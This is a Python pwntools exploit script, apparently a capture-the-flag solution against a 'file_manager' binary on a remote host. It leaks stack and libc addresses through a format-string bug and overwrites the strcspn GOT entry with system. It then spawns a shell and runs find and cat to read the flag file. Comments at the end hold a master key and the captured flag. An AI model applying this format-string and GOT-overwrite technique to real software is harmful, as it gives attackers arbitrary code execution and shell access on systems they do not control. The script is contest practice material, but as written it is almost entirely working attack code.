#!/usr/bin/env python3

from pwn import *

# ENV
PORT = 1337
HOST = "35.240.149.115"
exe = context.binary = ELF('./file_manager_patched', checksec=False)
libc = ELF('./libc.so.6', checksec=False)
ld = ELF('./ld-linux-x86-64.so.2', checksec=False)

def GDB():
    if not args.r:
        gdb.attach(p, gdbscript='''
            source /home/nhh/pwndbg/gdbinit.py
            b* 0x00000000004026BD
            b* 0x0000000000402660
            c
            set follow-fork-mode parent
            ''')

if len(sys.argv) > 1 and sys.argv[1] == 'r':
    p = remote(HOST, PORT)
else:
    p = exe.process()

def register(user, passwd):
	p.sendlineafter(b'> ', b'register')
	p.sendlineafter(b'Username: ', user)
	p.sendlineafter(b'Password: ', passwd)

def login(user, passwd):
	p.sendlineafter(b'> ', b'login')
	p.sendlineafter(b'Username: ', user)
	p.sendlineafter(b'Password: ', passwd)

# VARIABLE


# PAYLOAD
register(b'abcd', b'abcd')
login(b'abcd', b'abcd')
p.sendlineafter(b'> ', b'cd files')
p.sendlineafter(b'> ', b'cd a')
p.sendlineafter(b'> ', b'write a.txt')
p.sendlineafter(b'): ', b'%8$p|%9$p|'.hex())
p.sendlineafter(b'> ', b'cat a.txt')
stack_leak = int(p.recvuntil(b'|', drop=True), 16)
log.info("Stack leak: " + hex(stack_leak))
libc_leak = int(p.recvuntil(b'|', drop=True), 16)
libc.address = libc_leak - libc.sym._IO_2_1_stdout_
log.info("Libc leak: " + hex(libc.address))

pop_rdi = 0x000000000010f78b + libc.address
ret = pop_rdi + 1
system = libc.sym.system
bin_sh = next(libc.search(b'/bin/sh'))

package = {
    system & 0xff: exe.got.strcspn,
    system >> 8 & 0xff: exe.got.strcspn + 1,
    system >> 16 & 0xff: exe.got.strcspn + 2
}
order = sorted(package)

# payload = f'%{stack_leak + 0x588 & 0xffff}c%8$hn'.encode()
payload = f'%{order[0]}c%11$hhn'.encode()
payload += f'%{order[1] - order[0]}c%12$hhn'.encode()
payload += f'%{order[2] - order[1]}c%13$hhn'.encode()
payload = payload.ljust(64 - 24, b'\0')
payload += flat(
	package[order[0]],
	package[order[1]],
	package[order[2]]
    )
p.sendlineafter(b'> ', b'write a.txt')
p.sendlineafter(b'): ', payload.hex())
p.sendlineafter(b'> ', b'cat a.txt')

p.sendlineafter(b'> ', b'/bin/sh\0')

p.sendline(b'find / -type f -iname "*flag*" 2>/dev/null')
p.sendline(b'cat /flag.txt')

p.interactive()

# MASTER_KEY=1c8e7b8b76e2c3a9

# Dynamic flag: CSCV2025{c1e03f78cfb98acbebc27281ad171262}